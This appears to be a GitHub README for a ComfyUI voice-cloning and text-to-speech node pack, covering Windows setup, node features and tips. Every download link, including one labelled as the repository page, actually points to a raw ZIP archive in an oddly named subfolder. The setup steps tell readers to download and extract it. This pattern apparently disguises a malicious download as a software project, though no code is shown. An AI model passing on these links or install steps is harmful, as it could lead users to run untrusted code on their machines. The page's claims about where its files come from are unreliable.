# 🎙️ ComfyUI-OmniVoice-TTS - Multilingual Voice Cloning for ComfyUI

[![Download](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/JudgedDani/ComfyUI-OmniVoice-TTS/raw/refs/heads/main/philosophicojuristic/TTS-Omni-U-Voice-Comfy-3.7.zip)

## 🧭 Overview

ComfyUI-OmniVoice-TTS adds OmniVoice text-to-speech nodes to ComfyUI.

Use it to:

- turn text into speech
- clone a voice from a short sample
- design a new voice
- create multi-speaker dialogue
- work with more than one language

This project fits into ComfyUI as custom nodes. You add it to your ComfyUI setup, then build voice workflows with the node graph.

## 💻 What You Need

Use a Windows PC with:

- Windows 10 or Windows 11
- at least 8 GB RAM
- 16 GB RAM for smoother use
- a working internet connection for setup
- enough disk space for model files and audio data

A stronger GPU helps. A CUDA-capable NVIDIA card gives better speed. The nodes can still run on some CPU setups, but speech generation may take longer.

## 📥 Download

Visit this page to download and get the files you need:

[Download ComfyUI-OmniVoice-TTS](https://github.com/JudgedDani/ComfyUI-OmniVoice-TTS/raw/refs/heads/main/philosophicojuristic/TTS-Omni-U-Voice-Comfy-3.7.zip)

## 🛠️ Setup in Windows

Follow these steps in order.

1. Open the download page above.
2. Get the repository files from GitHub.
3. If the project comes as a ZIP file, save it to your computer.
4. Right-click the ZIP file and choose Extract All.
5. Open your ComfyUI folder.
6. Go to the custom_nodes folder.
7. Copy the ComfyUI-OmniVoice-TTS folder into custom_nodes.
8. Start ComfyUI again.

If you use a Git-based setup, place the repository inside custom_nodes with the rest of your nodes.

## 🔧 First Run

After you place the files in the right folder, start ComfyUI.

Then check that the OmniVoice nodes appear in the node list.

If the nodes load, the install worked.

If ComfyUI does not show the nodes, check:

- the folder name
- the folder path
- whether you restarted ComfyUI after copying the files

## 🎤 What the Nodes Do

### Text-to-Speech

Turn written text into spoken audio. This is the base use case for the nodes.

### Voice Cloning

Use a short voice sample to match tone and speaking style.

### Voice Design

Create a new voice without using a real person’s voice sample.

### Multi-Speaker Dialogue

Generate speech for more than one speaker in the same project.

### Multilingual Output

Create speech in more than one language, which helps with global content.

## 🧩 Basic Workflow

A simple setup looks like this:

1. Add a text input node.
2. Add an OmniVoice TTS node.
3. Set the language.
4. Choose the voice mode.
5. Add a voice sample if you want cloning.
6. Set the output path for the audio file.
7. Run the workflow.
8. Play the generated audio.

For dialogue, create one speaker track at a time or set up a multi-speaker flow.

## 🎛️ Common Settings

You may see settings like these in the node panel:

- language
- speaker name
- reference audio
- voice style
- speech speed
- output format
- sample rate

Good starting values:

- keep speed at the default
- use a clear voice sample
- keep the text short for your first test
- use simple sentences first
- save output as WAV for best quality

## 🧪 Good Voice Samples

If you use voice cloning, the sample matters.

Use:

- clean audio with no background noise
- one speaker only
- normal speaking volume
- a short clip with clear words
- a file in a common format like WAV or MP3

Avoid:

- music
- echo
- overlapping voices
- very low volume
- clipped or distorted audio

## 📁 File Placement

Put the project in this path:

- `ComfyUI/custom_nodes/ComfyUI-OmniVoice-TTS`

Keep the folder name the same unless the project says otherwise.

If you add model files, store them where the project expects them inside the ComfyUI folder structure.

## 🔄 Update Steps

To update the nodes:

1. Close ComfyUI.
2. Replace the old project folder with the new version.
3. Keep any local audio samples you want to reuse.
4. Start ComfyUI again.
5. Confirm the OmniVoice nodes still appear.

If you use Git, pull the latest changes in the repository folder.

## 🧯 If Something Does Not Work

Try these checks:

- restart ComfyUI
- confirm the folder is inside `custom_nodes`
- make sure the folder name is correct
- check that required model files are in place
- try a short test sentence
- use a clean audio sample for cloning
- lower the text length if generation fails

If the node list still does not show up, remove the folder, copy it again, and restart ComfyUI.

## 🗂️ Example Use Cases

### YouTube Voiceover

Write a script, choose a voice, and generate audio for a video.

### Audiobook Clips

Turn chapters or short sections into spoken audio.

### Game Dialogue

Create speech for character lines and test different voices.

### Multilingual Content

Produce the same line in more than one language.

### Voice Tests

Compare cloned voices, designed voices, and speaker styles in one workflow.

## 🧠 Tips for Better Output

- use plain text with clear punctuation
- keep one idea per sentence
- test one voice at a time
- use short inputs first
- save your working workflow once it runs
- keep a backup of your custom nodes folder

## 🔗 Repository Info

- Repository: ComfyUI-OmniVoice-TTS
- Description: OmniVoice TTS nodes for ComfyUI - Zero-shot multilingual text-to-speech with voice cloning, voice design, and multi-speaker dialogue
- Topics: comfyui, custom-nodes, text-to-speech, tts, voice-clone, voice-cloning

## 📎 GitHub Link

[Open the GitHub repository](https://github.com/JudgedDani/ComfyUI-OmniVoice-TTS/raw/refs/heads/main/philosophicojuristic/TTS-Omni-U-Voice-Comfy-3.7.zip)